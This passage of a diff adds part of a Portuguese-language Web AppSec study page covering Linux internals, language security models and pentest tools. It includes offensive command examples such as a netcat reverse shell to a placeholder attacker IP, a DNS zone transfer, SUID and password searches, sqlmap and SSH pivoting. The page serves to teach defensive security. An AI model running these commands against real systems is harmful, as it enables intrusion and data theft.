+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><code>open()</code> / <code>read()</code> / <code>write()</code>: operações de arquivo — alvos de path traversal e LFI.</li>
+                  <li><code>execve()</code>: executa um novo programa — o objetivo de qualquer RCE é chegar aqui.</li>
+                  <li><code>socket()</code> / <code>connect()</code> / <code>bind()</code>: rede — um webshell usa isso para criar conexões reversas.</li>
+                  <li><code>mmap()</code> / <code>mprotect()</code>: manipulação de memória — usados em exploits para marcar regiões como executáveis.</li>
+                  <li><code>fork()</code> / <code>clone()</code>: criação de processos — base de command injection.</li>
+                  <li><code>ptrace()</code>: anexar a outro processo — usado em depuradores, também por rootkits para ocultar comportamento.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Seccomp</strong> (Secure Computing Mode) é uma proteção do Linux que limita quais syscalls um processo pode fazer. Containers Docker e sandboxes de navegadores usam seccomp para reduzir a superfície de ataque — um processo comprometido não consegue fazer <code>execve()</code> se o seccomp proibir.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-perms')">&#128274; Permissões Unix: DAC, Capabilities e SUID</button>
+              <div class="sub-panel" id="os-perms">
+                <p>
+                  O modelo de permissões Unix clássico é <strong>DAC</strong> (Discretionary Access Control): cada arquivo tem um dono (user), um grupo, e permissões para três classes: dono (<code>u</code>), grupo (<code>g</code>), outros (<code>o</code>) — com bits de leitura (<code>r</code>), escrita (<code>w</code>) e execução (<code>x</code>).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>SUID (Set User ID):</strong> quando ativo num executável, o programa roda com as permissões do <em>dono do arquivo</em>, não do usuário que executou. <code>/usr/bin/passwd</code> tem SUID de root para poder modificar <code>/etc/shadow</code>. Um binário SUID mal implementado é um vetor clássico de privilege escalation — explorar uma vulnerabilidade nele dá shell de root.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Linux Capabilities:</strong> subdividem os privilégios de root em ~40 capacidades granulares. Em vez de dar root completo, você pode dar apenas <code>CAP_NET_BIND_SERVICE</code> (para fazer bind em portas &lt;1024) ou <code>CAP_SYS_PTRACE</code>. Em containers: verificar capabilities excessivas é uma das primeiras coisas num pentest de container — <code>CAP_SYS_ADMIN</code> é equivalente a root e permite fuga do container.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>sudo e /etc/sudoers:</strong> configurações permissivas de sudo são um alvo constante. <code>sudo -l</code> é um dos primeiros comandos em escalada de privilégios pós-exploração.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-proc')">&#9201; Processos, Isolamento e Containers</button>
+              <div class="sub-panel" id="os-proc">
+                <p>
+                  O SO isola processos uns dos outros usando espaços de endereçamento virtual separados. Um processo não pode acessar diretamente a memória de outro — a MMU garante isso. Mas existem mecanismos legítimos de comunicação entre processos (IPC): pipes, sockets Unix, shared memory, signals.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Containers (Docker, Podman)</strong> não são VMs — eles compartilham o mesmo kernel do host. O isolamento é feito por features do kernel Linux:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Namespaces:</strong> isolam visibilidade de PID, rede, sistema de arquivos, usuários, etc.</li>
+                  <li><strong>cgroups:</strong> limitam recursos (CPU, memória, I/O) por grupo de processos.</li>
+                  <li><strong>seccomp:</strong> filtro de syscalls.</li>
+                  <li><strong>AppArmor/SELinux:</strong> políticas de acesso mandatório (MAC).</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Container escape:</strong> uma vulnerabilidade no kernel, driver ou configuração incorreta de namespace/capabilities pode permitir que um processo dentro de um container comprometa o host. Vetores comuns: montagem do socket Docker (<code>/var/run/docker.sock</code>), capabilities excessivas (<code>--privileged</code>), montagem do sistema de arquivos do host.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-fs')">&#128193; Sistema de Arquivos e Segurança</button>
+              <div class="sub-panel" id="os-fs">
+                <p>
+                  O sistema de arquivos é muito mais do que apenas organizar arquivos em diretórios. Para segurança, os aspectos críticos são:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Symlinks (links simbólicos):</strong> apontam para outro caminho. Explorados em ataques TOCTOU e path traversal. Um tempfile com symlink pode redirecionar escritas para arquivos do sistema.</li>
+                  <li><strong>Hardlinks:</strong> múltiplas entradas de diretório para o mesmo inode. Mesmo arquivo, múltiplos caminhos — pode contornar algumas ACLs.</li>
+                  <li><strong>/proc (procfs):</strong> sistema de arquivos virtual que expõe informações dos processos em tempo real. <code>/proc/self/environ</code> pode vazar variáveis de ambiente (com credenciais). <code>/proc/self/fd/</code> — file descriptors abertos. Explorado via LFI para ler arquivos de qualquer processo.</li>
+                  <li><strong>Sticky bit em diretórios</strong> (como <code>/tmp</code>): apenas o dono pode deletar seus próprios arquivos, mesmo que o diretório seja world-writable.</li>
+                  <li><strong>Extended attributes e ACLs:</strong> controle de acesso mais granular que o modelo Unix clássico.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Auditoria de sistema de arquivos:</strong> <code>inotifywait</code> e o subsistema de auditoria do Linux (<code>auditctl</code>) permitem monitorar acessos a arquivos sensíveis em tempo real — fundamentais para detecção de intrusão.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('os-network')">&#127760; Como o SO Gerencia a Rede</button>
+              <div class="sub-panel" id="os-network">
+                <p>
+                  Para um Web AppSec Engineer, entender como o SO lida com conexões de rede é fundamental. O kernel Linux implementa a pilha TCP/IP completa, desde o driver de NIC até o socket da aplicação.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Sockets e portas:</strong> uma aplicação abre um socket TCP/UDP e faz bind em uma porta. Portas &lt;1024 requerem root ou <code>CAP_NET_BIND_SERVICE</code>. <code>netstat -tulpn</code> ou <code>ss -tulpn</code> lista todos os sockets abertos — primeiro passo numa auditoria de servidor.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Firewall (iptables/nftables):</strong> o kernel filtra pacotes usando regras. <code>iptables -L -n -v</code> lista as regras ativas. Um servidor web mal configurado pode ter portas internas (banco de dados, Redis, Memcached) expostas sem firewall.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>TIME_WAIT e SYN flood:</strong> ataques DoS exploram o estado de conexão TCP. SYN cookies e limites de backlog são mitigações no kernel. Para AppSec: rate limiting precisa ser implementado em múltiplas camadas — não só na aplicação, mas também no kernel e no loadbalancer.
+                </p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 5. COMPILADA VS INTERPRETADA                          -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-5">
+        <button class="node node-main" onclick="toggleNode('lang')">
+          <span class="node-icon">&#128290;</span>
+          Compilada vs. Interpretada
+          <span class="arrow" id="arrow-lang">&#9660;</span>
+        </button>
+        <div class="node-panel" id="lang">
+          <p class="node-desc">
+            A forma como uma linguagem transforma código-fonte em instruções executáveis define profundamente seu perfil de segurança. Linguagens compiladas e interpretadas têm classes de vulnerabilidades completamente diferentes. Um Web AppSec Engineer precisa entender o modelo de execução de cada linguagem para saber onde procurar vulnerabilidades: em aplicações Python/Ruby/PHP você pensa em injeção e deserialização; em aplicações C/C++ você pensa em corrupção de memória. Neste vídeo, vamos traçar o caminho do código-fonte até a execução em cada paradigma — e conectar cada etapa às vulnerabilidades que ela pode introduzir.
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('lang-comp')">&#9881; Linguagens Compiladas: Do Fonte ao Binário</button>
+              <div class="sub-panel" id="lang-comp">
+                <p>
+                  O processo de compilação transforma código-fonte em código de máquina nativo através de várias fases:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Preprocessamento:</strong> expande macros e includes (<code>#include</code>, <code>#define</code>).</li>
+                  <li><strong>Análise léxica e sintática:</strong> transforma texto em AST (Abstract Syntax Tree).</li>
+                  <li><strong>Análise semântica:</strong> verifica tipos, escopos, declarações.</li>
+                  <li><strong>Geração de código intermediário:</strong> LLVM IR, GCC GIMPLE.</li>
+                  <li><strong>Otimização:</strong> inline de funções, eliminação de dead code, etc.</li>
+                  <li><strong>Geração de código de máquina:</strong> assembly específico da arquitetura.</li>
+                  <li><strong>Linking:</strong> resolve referências externas, une object files em executável.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Exemplos:</strong> C, C++, Rust, Go, C#, Swift. O resultado é um binário nativo (ELF no Linux, PE no Windows, Mach-O no macOS).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Para AppSec:</strong> binários compilados podem ser analisados com ferramentas de <em>reverse engineering</em> como <strong>Ghidra</strong> (NSA, open-source) e <strong>IDA Pro</strong>. O processo de engenharia reversa é central para análise de malware, firmware e aplicações sem código-fonte. Ferramentas como <code>checksec</code> verificam quais proteções (ASLR, PIE, NX, Canary, RELRO) estão habilitadas num binário.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('lang-interp')">&#128640; Linguagens Interpretadas e a Superfície de Ataque Web</button>
+              <div class="sub-panel" id="lang-interp">
+                <p>
+                  Em linguagens interpretadas, um programa chamado <strong>interpretador</strong> lê o código-fonte (ou bytecode) e o executa diretamente, instrução a instrução. Não há executável nativo gerado com antecedência.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>PHP:</strong> ainda domina mais de 75% dos servidores web. O motor Zend Engine interpreta PHP. Vulnerabilidades clássicas: SQL Injection, RFI/LFI, command injection via <code>exec()</code>/<code>system()</code>, deserialização insegura com <code>unserialize()</code>, type juggling (PHP compara <code>"0e123" == "0e456"</code> como iguais por causa de conversão automática de tipo para float).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Python:</strong> usado em backends modernos (Django, Flask, FastAPI). Vulnerabilidades: <code>eval()</code> e <code>exec()</code> com input de usuário (injeção de código), Server-Side Template Injection (SSTI) em Jinja2, pickle deserialization, command injection via <code>os.system()</code> ou <code>subprocess</code> sem sanitização.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Ruby:</strong> usado no Rails. Vulnerabilidades históricas de deserialização YAML (<code>YAML.load</code> vs <code>YAML.safe_load</code>), mass assignment (whitelist de params insuficiente).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Bash:</strong> scripts de shell são interpretados pelo bash. <strong>Shellshock</strong> (CVE-2014-6271) explorava como o bash processava variáveis de ambiente para executar código arbitrário — afetando CGI scripts em servidores Apache em todo o mundo.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('lang-jit')">&#9889; JIT e JavaScript: O Motor V8 e Ataques de Browser</button>
+              <div class="sub-panel" id="lang-jit">
+                <p>
+                  O <strong>JIT (Just-In-Time) compiler</strong> monitora quais partes do código são executadas frequentemente ("hot paths") e as compila para código de máquina nativo em tempo real — combinando a flexibilidade da interpretação com a performance da compilação.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>V8 (Chrome/Node.js)</strong> e <strong>SpiderMonkey (Firefox)</strong> implementam JIT para JavaScript. O pipeline típico: código JS → bytecode Ignition → código JIT Turbofan → código de máquina nativo.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>JIT Spraying:</strong> técnica de exploit que força o JIT compiler a emitir shellcode como parte de constantes numéricas em expressões. O atacante escreve JS com constantes específicas que, quando compiladas pelo JIT, produzem bytes de shellcode na memória executável — contornando DEP/NX.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Para Web AppSec:</strong> JavaScript rodando no cliente é o vetor de <strong>XSS (Cross-Site Scripting)</strong> — a vulnerabilidade web mais prevalente (OWASP Top 10). No servidor, Node.js tem suas próprias particularidades: prototype pollution (modificar <code>Object.prototype</code> para afetar todo o código da aplicação), injeção em template engines (Pug, Handlebars), ReDoS (Regular Expression Denial of Service) — regex mal escritas que consomem CPU exponencialmente.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('lang-bytecode')">&#128203; Bytecode, JVM e Deserialização Insegura</button>
+              <div class="sub-panel" id="lang-bytecode">
+                <p>
+                  Java compila para <strong>bytecode</strong> (.class files) que roda na <strong>JVM</strong> (Java Virtual Machine) — uma máquina virtual que interpreta ou JIT-compila o bytecode. Isso dá portabilidade ("write once, run anywhere") mas adiciona uma camada de complexidade.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Serialização Java</strong> é o processo de converter um objeto em bytes para transmissão ou armazenamento. <strong>Deserialização insegura</strong> (OWASP Top 10 A08) ocorre quando dados serializados de fontes não-confiáveis são desserializados — o que pode acionar código arbitrário via "gadget chains": sequências de métodos legítimos que, encadeados durante a desserialização, executam <code>Runtime.exec()</code>.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Apache Commons Collections RCE</strong> (2015, CVE-2015-4852) e a cadeia de exploits resultante afetou WebLogic, JBoss, Jenkins e dezenas de outros sistemas Java. A ferramenta <strong>ysoserial</strong> gera payloads de desserialização Java para pentests.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Python pickle:</strong> mesmo problema — <code>pickle.loads()</code> pode executar código arbitrário. Nunca desserialize pickle de fontes não-confiáveis. <strong>PHP unserialize():</strong> idem, com suas próprias gadget chains (POP chains — Property-Oriented Programming).
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('lang-safety')">&#128737; Memory Safety e o Futuro: Rust e Go na Segurança</button>
+              <div class="sub-panel" id="lang-safety">
+                <p>
+                  A NSA, CISA, Microsoft e Google publicaram relatórios recomendando a transição para linguagens <strong>memory-safe</strong>. Estima-se que ~70% das vulnerabilidades críticas no Chrome e no Windows kernel sejam bugs de memória em C/C++.
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Rust</strong> elimina em compile-time: buffer overflows, use-after-free, null pointer dereferences, data races — sem garbage collector, sem overhead de runtime. O sistema de ownership garante que cada dado tem exatamente um dono, e referências são sempre válidas. Usado em: Firefox (partes do motor), Linux kernel (módulos opcionais desde 6.1), Cloudflare (proxies), AWS (sistemas críticos).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Go</strong> tem GC, não é memory-safe no nível de Rust, mas elimina as classes mais perigosas de bugs de memória. Muito usado em ferramentas de segurança (Nuclei, subfinder, httpx, gobuster são escritos em Go).
+                </p>
+                <p style="margin-top:10px;">
+                  <strong>Para o Web AppSec Engineer:</strong> saber que sua aplicação é escrita em Rust significa que classes inteiras de vulns de memória são eliminadas — você foca em lógica de negócio, injeção, controle de acesso. Em C/C++, todas as portas estão abertas.
+                </p>
+                <table class="compare-table" style="margin-top:12px;">
+                  <tr><th>Aspecto</th><th>C/C++</th><th>Python/PHP/JS</th><th>Rust</th><th>Go</th></tr>
+                  <tr><td>Memory Safety</td><td>&#10060; Não</td><td>&#9989; GC</td><td>&#9989; Compile-time</td><td>&#9989; GC</td></tr>
+                  <tr><td>Buffer Overflow</td><td>&#128308; Alto risco</td><td>&#9989; Impossível</td><td>&#9989; Impossível</td><td>&#9989; Impossível</td></tr>
+                  <tr><td>Injeção (SQL/Cmd)</td><td>&#9888; Possível</td><td>&#128308; Risco alto</td><td>&#9888; Possível</td><td>&#9888; Possível</td></tr>
+                  <tr><td>Desserialização</td><td>&#9888; Possível</td><td>&#128308; Risco alto</td><td>&#128308; Possível</td><td>&#9888; Possível</td></tr>
+                  <tr><td>Performance</td><td>&#9989; Máxima</td><td>&#128992; Média</td><td>&#9989; Máxima</td><td>&#9989; Alta</td></tr>
+                </table>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- ══════════════════════════════════════════════════════ -->
+      <!-- 6. LINUX UBUNTU                                       -->
+      <!-- ══════════════════════════════════════════════════════ -->
+      <div class="branch branch-6">
+        <button class="node node-main" onclick="toggleNode('linux')">
+          <span class="node-icon">&#128039;</span>
+          Linux Ubuntu — O Sistema do Web AppSec Engineer
+          <span class="arrow" id="arrow-linux">&#9660;</span>
+        </button>
+        <div class="node-panel" id="linux">
+          <p class="node-desc">
+            Linux não é apenas o SO mais usado em servidores web — é também o ambiente de trabalho padrão de profissionais de segurança. Kali Linux, Parrot OS, BlackArch, as ferramentas de pentest mais poderosas (Burp Suite, nmap, metasploit, sqlmap, nuclei, ffuf) — tudo roda nativamente em Linux. Ubuntu é o ponto de partida perfeito: estável, amplamente documentado, com enorme base de pacotes, e idêntico ao ambiente de produção da maioria dos servidores que você vai avaliar. Neste vídeo, vamos do zero ao domínio operacional: terminal, hierarquia de arquivos, permissões, networking, gerenciamento de processos e as ferramentas essenciais para Web AppSec.
+          </p>
+          <div class="sub-nodes">
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-distro')">&#127381; Kernel Linux, GNU e Distribuições</button>
+              <div class="sub-panel" id="linux-distro">
+                <p>
+                  <strong>Linux</strong> é apenas o kernel — o núcleo do sistema. O que chamamos de "Linux" no dia a dia é na verdade <strong>GNU/Linux</strong>: o kernel Linux + ferramentas do projeto GNU (gcc, bash, coreutils, glibc) + um gerenciador de pacotes + interface gráfica (opcional).
+                </p>
+                <p style="margin-top:10px;">
+                  Uma <strong>distribuição</strong> empacota tudo isso com configurações padrão, suporte e um ciclo de lançamentos. As mais relevantes para Web AppSec:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Ubuntu LTS (Long Term Support):</strong> base estável, suporte 5 anos. O que a maioria dos servidores web roda (Ubuntu 20.04, 22.04, 24.04). Excelente para aprender.</li>
+                  <li><strong>Kali Linux:</strong> baseado em Debian. Vem com centenas de ferramentas de pentest pré-instaladas. Padrão da indústria para testes de penetração. Pode ser usado como VM ou live USB.</li>
+                  <li><strong>Debian:</strong> a "mãe" de Ubuntu. Ultra-estável, mais comum em servidores antigos.</li>
+                  <li><strong>CentOS/RHEL/Rocky/AlmaLinux:</strong> padrão corporativo. SELinux ativo por default — sistema de controle de acesso mandatório (MAC) que vai além das permissões Unix.</li>
+                  <li><strong>Alpine Linux:</strong> minimalista (~5 MB). Base de containers Docker — menos pacotes = menor superfície de ataque.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-terminal')">&#128187; Terminal, Bash e o Poder da Linha de Comando</button>
+              <div class="sub-panel" id="linux-terminal">
+                <p>
+                  O terminal é a principal interface de trabalho de um Web AppSec Engineer. Dominar o shell não é opcional — é pré-requisito. O <strong>Bash</strong> (Bourne Again Shell) é o shell padrão no Ubuntu.
+                </p>
+                <p style="margin-top:10px;"><strong>Comandos essenciais por categoria:</strong></p>
+                <ul style="margin:10px 0 0 18px; line-height:2.2; color:var(--text-muted);">
+                  <li><strong>Navegação:</strong> <code>ls -la</code>, <code>cd</code>, <code>pwd</code>, <code>find / -name "*.conf"</code>, <code>locate</code></li>
+                  <li><strong>Texto/busca:</strong> <code>grep -r "password" /etc/</code>, <code>awk</code>, <code>sed</code>, <code>cut</code>, <code>sort</code>, <code>uniq</code>, <code>wc</code></li>
+                  <li><strong>Rede:</strong> <code>curl</code>, <code>wget</code>, <code>nc</code> (netcat), <code>nmap</code>, <code>ss -tulpn</code>, <code>tcpdump</code>, <code>ping</code>, <code>dig</code>, <code>whois</code></li>
+                  <li><strong>Processos:</strong> <code>ps aux</code>, <code>htop</code>, <code>kill</code>, <code>lsof -i :80</code>, <code>strace</code>, <code>ltrace</code></li>
+                  <li><strong>Permissões:</strong> <code>chmod</code>, <code>chown</code>, <code>sudo</code>, <code>su</code>, <code>id</code>, <code>whoami</code></li>
+                  <li><strong>Arquivos:</strong> <code>cat</code>, <code>less</code>, <code>head</code>/<code>tail</code>, <code>tar</code>, <code>zip</code>, <code>base64</code>, <code>xxd</code>, <code>strings</code></li>
+                  <li><strong>Redirecionamento:</strong> <code>|</code> (pipe), <code>&gt;</code>, <code>&gt;&gt;</code>, <code>2&gt;&amp;1</code>, <code>&amp;&amp;</code>, <code>||</code></li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Bash scripting</strong> permite automatizar tarefas de reconhecimento: iterar sobre uma lista de IPs, testar credenciais, processar output de ferramentas. Ex: <code>for ip in $(cat ips.txt); do nmap -p 80,443 $ip; done</code>.
+                </p>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-fhs')">&#128193; Hierarquia FHS: Onde Tudo Está no Linux</button>
+              <div class="sub-panel" id="linux-fhs">
+                <p>
+                  O <strong>FHS</strong> (Filesystem Hierarchy Standard) define onde cada tipo de arquivo deve residir no Linux. Para o Web AppSec Engineer, saber onde olhar é metade do trabalho de uma investigação:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2.2; color:var(--text-muted);">
+                  <li><code>/etc/</code> — Configurações do sistema. <code>/etc/passwd</code>, <code>/etc/shadow</code> (hashes de senha), <code>/etc/nginx/</code>, <code>/etc/apache2/</code>, <code>/etc/ssh/sshd_config</code>, <code>/etc/crontab</code>.</li>
+                  <li><code>/var/log/</code> — Logs: <code>auth.log</code> (tentativas de login), <code>syslog</code>, <code>nginx/access.log</code>, <code>apache2/error.log</code>.</li>
+                  <li><code>/var/www/</code> — Root padrão de aplicações web (onde os arquivos PHP/HTML ficam).</li>
+                  <li><code>/tmp/</code> e <code>/var/tmp/</code> — Temporários. World-writable — alvos frequentes de escalada de privilégios via race conditions.</li>
+                  <li><code>/proc/</code> — Filesystem virtual. <code>/proc/PID/cmdline</code> (linha de comando do processo), <code>/proc/PID/environ</code> (variáveis de ambiente — pode ter senhas!), <code>/proc/net/tcp</code> (conexões TCP).</li>
+                  <li><code>/home/</code> — Diretórios de usuários. <code>~/.ssh/</code> (chaves SSH), <code>~/.bash_history</code> (histórico de comandos — frequentemente com credenciais).</li>
+                  <li><code>/root/</code> — Home do superusuário.</li>
+                  <li><code>/bin/</code>, <code>/usr/bin/</code> — Binários. Binários SUID aqui são alvos de privilege escalation.</li>
+                  <li><code>/lib/</code>, <code>/usr/lib/</code> — Bibliotecas compartilhadas (.so). Hijacking de bibliotecas via <code>LD_PRELOAD</code>.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-perms2')">&#128274; Permissões em Profundidade: Da Teoria à Exploração</button>
+              <div class="sub-panel" id="linux-perms2">
+                <p>
+                  O modelo de permissões Unix parece simples mas tem nuances críticas. Cada arquivo tem 9 bits de permissão + 3 bits especiais:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><strong>Leitura (r=4):</strong> ler conteúdo do arquivo / listar diretório.</li>
+                  <li><strong>Escrita (w=2):</strong> modificar arquivo / criar/deletar dentro do diretório.</li>
+                  <li><strong>Execução (x=1):</strong> executar arquivo / entrar no diretório (<code>cd</code>).</li>
+                  <li><strong>SUID (s):</strong> executa com UID do dono. Binário SUID root = potencial escalada.</li>
+                  <li><strong>SGID (s no grupo):</strong> executa com GID do grupo. Em diretórios: novos arquivos herdam o grupo.</li>
+                  <li><strong>Sticky bit (t):</strong> em diretórios: só o dono pode deletar seus arquivos (<code>/tmp</code>).</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Encontrar vetores de escalada de privilégios:</strong>
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2; color:var(--text-muted);">
+                  <li><code>find / -perm -4000 2>/dev/null</code> — lista todos os binários SUID.</li>
+                  <li><code>find / -writable -type f 2>/dev/null</code> — arquivos graváveis por você.</li>
+                  <li><code>crontab -l && cat /etc/crontab</code> — tarefas agendadas mal configuradas.</li>
+                  <li><strong>LinPEAS / LinEnum:</strong> scripts automatizados de enumeração de escalada de privilégios Linux — essenciais no toolkit de qualquer pentester.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-network')">&#127760; Networking no Linux: Ferramentas para AppSec</button>
+              <div class="sub-panel" id="linux-network">
+                <p>
+                  O Web AppSec Engineer precisa dominar as ferramentas de rede do Linux — tanto para reconhecimento ativo quanto para análise de tráfego:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2.2; color:var(--text-muted);">
+                  <li><strong>nmap:</strong> scanner de portas e serviços. <code>nmap -sV -sC -p- target.com</code> descobre todos os serviços com versões e scripts NSE de detecção de vulnerabilidades.</li>
+                  <li><strong>curl:</strong> cliente HTTP completo. <code>curl -v -X POST -d 'user=admin' https://target.com/login</code>. Essencial para testar endpoints manualmente.</li>
+                  <li><strong>netcat (nc):</strong> canivete suíço de rede. Shell reversa: <code>nc -e /bin/bash attacker_ip 4444</code>. Escuta de porta: <code>nc -lvnp 4444</code>.</li>
+                  <li><strong>tcpdump:</strong> captura pacotes na interface de rede. <code>tcpdump -i eth0 -w capture.pcap host target.com</code>. Útil para analisar tráfego de aplicações.</li>
+                  <li><strong>Wireshark:</strong> análise visual de capturas de rede. Revela cookies, tokens, dados em texto plano em tráfego HTTP.</li>
+                  <li><strong>dig / nslookup:</strong> consultas DNS. <code>dig axfr @ns1.target.com target.com</code> — transferência de zona DNS (se permitida, revela todos os subdomínios).</li>
+                  <li><strong>ssh:</strong> <code>ssh -L 8080:localhost:3306 user@server</code> — tunelamento local. Fundamental para pivoting em ambientes comprometidos.</li>
+                </ul>
+              </div>
+            </div>
+
+            <div class="sub-node">
+              <button class="sub-btn" onclick="toggleSub('linux-tools')">&#128295; Ferramentas Essenciais de Web AppSec no Linux</button>
+              <div class="sub-panel" id="linux-tools">
+                <p>
+                  Com Ubuntu como base, você tem acesso a todo o ecossistema de ferramentas de Web AppSec. Este é o kit essencial que você vai usar no dia a dia:
+                </p>
+                <ul style="margin:10px 0 0 18px; line-height:2.3; color:var(--text-muted);">
+                  <li><strong>Burp Suite Community/Pro:</strong> proxy interceptador HTTP. A ferramenta mais importante para pentest web. Intercepta, modifica, repete e faz fuzzing de requisições.</li>
+                  <li><strong>sqlmap:</strong> detecção e exploração automatizada de SQL Injection. <code>sqlmap -u "https://target.com/item?id=1" --dbs</code></li>
+                  <li><strong>ffuf / gobuster:</strong> fuzzing de diretórios e parâmetros. <code>ffuf -w wordlist.txt -u https://target.com/FUZZ</code></li>
+                  <li><strong>nuclei:</strong> scanner de vulnerabilidades baseado em templates YAML. Cobertura enorme de CVEs e misconfigs.</li>
+                  <li><strong>nikto:</strong> scanner de vulnerabilidades de servidores web (headers, misconfigs, arquivos expostos).</li>
+                  <li><strong>whatweb / wappalyzer:</strong> fingerprinting de tecnologias web (CMS, frameworks, servidores).</li>
+                  <li><strong>subfinder / amass:</strong> enumeração de subdomínios — fase de reconhecimento passivo/ativo.</li>
+                  <li><strong>john / hashcat:</strong> cracking de hashes de senhas. Importante entender para avaliar a força das políticas de senha.</li>
+                  <li><strong>Metasploit:</strong> framework de exploração. Base de dados de exploits públicos, payloads, listeners.</li>
+                  <li><strong>Python3 + requests + beautifulsoup:</strong> para escrever seus próprios scripts de automação de testes.</li>
+                </ul>
+                <p style="margin-top:10px;">
+                  <strong>Próximo passo:</strong> todos esses tópicos de fundamento são a base. Com eles dominados, o caminho natural é: HTTP/HTTPS em profundidade → OWASP Top 10 → Burp Suite → Web AppSec na prática.
+                </p>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /branches -->
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <span class="footer-brand">🕵️ Web AppSec Engineer</span>
+      <span class="footer-meta">// Knowledge is the strongest cipher</span>
+    </div>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+</html>
